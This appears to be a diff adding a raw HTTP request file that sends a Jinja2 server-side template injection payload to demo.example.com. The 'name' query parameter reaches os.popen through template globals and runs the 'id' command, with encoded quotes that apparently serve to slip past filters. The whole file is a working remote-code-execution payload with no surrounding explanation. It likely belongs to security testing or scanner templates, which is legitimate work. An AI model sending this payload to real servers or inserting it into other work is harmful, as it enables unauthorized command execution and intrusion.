@@ -1,0 +1,4 @@
+GET /a?name={{namespace.__init__.__globals__.os.popen(%26%2339;id%26%2339;).read()}} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
